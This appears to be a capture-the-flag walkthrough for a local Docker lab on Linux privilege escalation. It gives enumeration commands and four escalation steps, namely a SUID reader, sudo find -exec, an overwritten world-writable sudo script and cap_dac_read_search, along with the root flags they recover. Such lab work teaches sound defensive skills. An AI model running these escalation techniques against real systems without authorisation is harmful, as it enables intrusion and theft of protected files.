# Walkthrough

## Step 1: start the lab

```bash
docker compose up --build -d
ssh -p 2222 lowpriv@127.0.0.1
# password: lowpriv123
```

## Step 2: enumerate

```bash
# SUID
find / -perm -4000 -user root -type f 2>/dev/null
# finds /usr/local/bin/readfile

# sudo
sudo -l
# (ALL) NOPASSWD: /usr/bin/find
# (ALL) NOPASSWD: /opt/backup.sh

# world-writable backup script
ls -la /opt/backup.sh
# -rwxrwxrwx 1 root root ...

# capabilities
find / -not -path '/proc/*' -not -path '/sys/*' -type f 2>/dev/null | xargs getcap 2>/dev/null
# /usr/local/bin/py3 cap_dac_read_search=ep
```

## Step 3: flag 1 via SUID

```bash
/usr/local/bin/readfile /root/flag1.txt
```

```
POC{a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4}
```

## Step 4: flag 2 via sudo find

```bash
sudo find /root/flag2.txt -exec cat {} \;
```

```
POC{b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5}
```

## Step 5: flag 3 via writable sudo script

```bash
echo 'cat /root/flag3.txt' > /opt/backup.sh
sudo /opt/backup.sh
```

```
POC{c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6}
```

## Step 6: flag 4 via capabilities

```bash
/usr/local/bin/py3 -c "print(open('/root/flag4.txt').read(), end='')"
```

```
POC{d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1}
```

## Full attack chain

```
SSH as lowpriv (lowpriv123)

find / -perm -4000 -user root      -> /usr/local/bin/readfile (SUID)
  /usr/local/bin/readfile /root/flag1.txt -> flag1

sudo -l                            -> find NOPASSWD, /opt/backup.sh NOPASSWD
  sudo find /root/flag2.txt -exec cat {} \; -> flag2

ls -la /opt/backup.sh              -> world-writable
  echo 'cat /root/flag3.txt' > /opt/backup.sh
  sudo /opt/backup.sh              -> flag3

getcap /usr/local/bin/py3          -> cap_dac_read_search=ep
  /usr/local/bin/py3 -c "open('/root/flag4.txt').read()" -> flag4
```
